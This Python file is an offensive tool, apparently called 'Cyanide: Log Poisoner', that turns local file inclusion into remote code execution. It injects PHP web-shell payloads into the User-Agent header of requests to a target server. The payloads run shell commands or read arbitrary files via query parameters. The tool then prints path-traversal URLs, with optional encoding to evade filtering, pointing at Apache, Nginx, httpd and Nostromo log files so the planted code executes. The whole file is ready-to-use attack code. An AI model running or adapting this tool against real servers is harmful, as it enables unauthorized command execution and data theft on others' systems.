#!/usr/bin/python
import requests
import argparse
from colorama import init, Fore, Style
init(convert=True)


PAYLOADS = {
    "PHPCMD": ("<?php echo(isset($_GET['c']))?system($_GET['c']):'Usage: ?c=COMMAND'; ?>", "PHP Simple Command Injection", "[PHP] Simple command injection with query variable 'c'. Ex.: ?c=ls"),
    "PHPB64CMD": ("<?php echo(isset($_GET['b']))?system(urldecode(base64_decode($_GET['b']))):'Usage: ?b=B64_COMMAND'; ?>", "PHP Simple Base64 Command Injection", "[PHP] Simple command injection with query variable 'b', but the command is base64 and URL encoded. Ex.: ?b=bHM%3D"),
    "PHPREADFILE": ("<?php echo(isset($_GET['f']))?('<code><pre>'.htmlentities(file_get_contents($_GET['f'])).'</pre></code>'):'Usage: ?f=FILENAME'; ?>", "PHP File Reader", "[PHP] Read a file's contents. Using parameter 'f' to specificy a filename. Ex.: ?f=filename.ext")
}

CODES = {
    "INFO": Fore.MAGENTA + "[i]" + Style.RESET_ALL,
    "HELP": Fore.GREEN + "[?]" + Style.RESET_ALL,
    "ERR": Fore.RED + "[!]" + Style.RESET_ALL,
    "SUC": Fore.CYAN + "[*]" + Style.RESET_ALL,
    "PROB": Fore.YELLOW + "[*?]" + Style.RESET_ALL
}


def banner():
    print(f"""===========================================================================
 ________      ___    ___________  ________   ___  ________ __________
/\\   ____\\    /\\  \\  /  /\\   __  \\/\\   ___  \\/\\  \\/\\   ___ \\\\    _____\\
\\ \\  \\___|    \\ \\  \\/  /\\ \\  \\_\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\_|\\ \\\\    ___\\
 \\ \\  \\____    \\ \\    /  \\ \\   __  \\ \\  \\\\ \\  \\ \\  \\ \\  \\_\\\\ \\\\   \\_____ 
  \\ \\_______\\ __\\/   /    \\ \\__\\ \\__\\ \\__\\\\ \\__\\ \\__\\ \\_______\\\\________\\
   \\|_______|/\\_____/      \\/__/\\/__/\\/__/ \\/__/\\/__/\\/_______//________/
=============\\/____/=======================================================
{CODES["INFO"]} Cyanide: Log Poisoner (LFI to RCE)
{CODES["INFO"]} Version: 1.0.0
{CODES["INFO"]} Author: Noxtal
{CODES["INFO"]} Website: https://noxtal.com
{CODES["INFO"]} BadByte Official Program (https://discord.gg/CDACNFg)
    """)


def print_payloads():
    print(f"{CODES['HELP']} AVAILABLE PAYLOADS")
    i = 0
    for payload in PAYLOADS.items():
        name = payload[0]
        data = payload[1]
        payl = data[0]
        shortname = data[1]
        desc = data[2]
        print(f"{Fore.GREEN}[{i}]{Style.RESET_ALL} {name} ({len(payl)} chars) -> {shortname}: {desc}")
        i += 1


def poison(url, payload, method="GET", parameter="page", encode_lvl=0, prefix="", suffix=""):
    headers = {"User-Agent": payload}
    try:
        if not url.startswith("http://"):
            url = f"http://{url}"
        if not url.endswith("/"):
            url = f"{url}/"

        dot = "."
        slash = "/"
        if encode_lvl == 1:
            dot = "%2e"
            slash = "%2f"
        elif encode_lvl == 2:
            dot = "%252e"
            slash = "%252f"

        r = requests.request(method, url, headers=headers)
        r.raise_for_status()

        print(f"""
{CODES["SUC"]} LOGS SUCCESSFULLY POISONED. (IF TARGET IS VULNERABLE)
Access your payload using one of the following URLs:
[Apache]
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache{slash}access{dot}log{suffix}
[Apache2]
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache2{slash}access{dot}log{suffix}
[Nginx]
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}nginx{slash}access{dot}log{suffix}
[httpd]
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}httpd{slash}access{suffix}
[Nostromo]
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}nostromo{slash}logs{slash}access_log{suffix}
              """)
    except requests.exceptions.HTTPError as e:
        print(f"{CODES['ERR']} HTTP ERROR:", e)
        print(f"""
{CODES["PROB"]} ERROR LOGS PROBABLY POISONED.
Try to access your payload using one of the following URLs:
[Apache]
- [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache{slash}access{dot}log{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache{slash}error{dot}log{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}usr{slash}local{slash}apache{slash}log{slash}error_log{suffix}
[Apache2]
- [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache2{slash}access{dot}log{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache2{slash}error{dot}log{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}usr{slash}local{slash}apache2{slash}log{slash}error_log{suffix}
[Nginx]
- [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}nginx{slash}access{dot}log{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}nginx{slash}error{dot}log{suffix}
[httpd]
- [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}httpd{slash}access{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}httpd{slash}error_log{suffix}
[Nostromo]
- [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}nostromo{slash}logs{slash}access_log{suffix}
              """)
    except requests.exceptions.ConnectionError as e:
        print(f"{CODES['ERR']} CONNECTION ERROR: ", e)
    except requests.exceptions.Timeout as e:
        print(f"{CODES['ERR']} TIMEOUT ERROR: ", e)
    except requests.exceptions.RequestException as e:
        print(f"{CODES['ERR']} UNEXPECTED ERROR: ", e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"Log poisoner. Turns a Local File Inclusion to a Remote Code Execution. Counts {len(PAYLOADS.keys())} different payloads for now.")
    parser.add_argument("-q", "--quiet", "--no-banner", action="store_true",
                        help="Quiet mode. No banner.")
    parser.add_argument("-Pl", "--payloads", "--list", action="store_true",
                        help="List all possible payloads.")
    parser.add_argument("-pl", "--payload", "--set-payload",
                        help="Set payload (by index or ID). Use -Pl to list available payloads.")
    parser.add_argument("-m", "--method", type=str,
                        help="HTTP request method. Ex.: POST")
    parser.add_argument("-P", "--par", "--parameter", metavar="PARAMETER", type=str,
                        help="Query parameter name. Ex.: '-P view' => '?view='")
    parser.add_argument("-e", "--encode", "--dds-encode", action="store_true",
                        help="URL encode ../")
    parser.add_argument("-E", "--double-encode", "--dds-double-encode", action="store_true",
                        help="Double-encode ../")
    parser.add_argument("-p", "--prefix", type=str,
                        help="Query prefix. Ex.: '../../../../../etc/cat/'")
    parser.add_argument("-s", "--suffix", type=str,
                        help="Query suffix. Ex.: '&other='")
    parser.add_argument("-u", "--URL", "--url", type=str,
                        help="URL to attack.")

    args = parser.parse_args()

    if not args.quiet:
        banner()

    if args.payloads:
        print_payloads()
    else:
        if args.URL != None:
            # Main program functionality
            encode_lvl = 0
            if args.encode:
                encode_lvl = 1
            if args.double_encode:
                encode_lvl = 2

            payload = None
            if args.payload == None:
                payload = PAYLOADS["PHPCMD"]
            else:
                if str.isnumeric(args.payload):
                    payload = PAYLOADS[list(PAYLOADS.keys())[int(args.payload)]]
                else:
                    if args.payload in PAYLOADS.keys():
                        payload = PAYLOADS[args.payload]
                    else:
                        print(
                            f"{CODES['ERR']} UNKNOWN PAYLOAD NAME OR INDEX '{args.payload}'!")
            print(f"{CODES['SUC']} SELECTED PAYLOAD: {payload[1]}")

            method = args.method if args.method != None else "GET"
            parameter = args.par if args.par != None else "page"
            prefix = args.prefix if args.prefix != None else ""
            suffix = args.suffix if args.suffix != None else ""

            poison(args.URL, payload[0], method,
                parameter, encode_lvl, prefix, suffix)
        else:
            print(f"{CODES['ERR']} PARSING ERROR: -u <URL> is required for this action.")
            parser.print_usage()
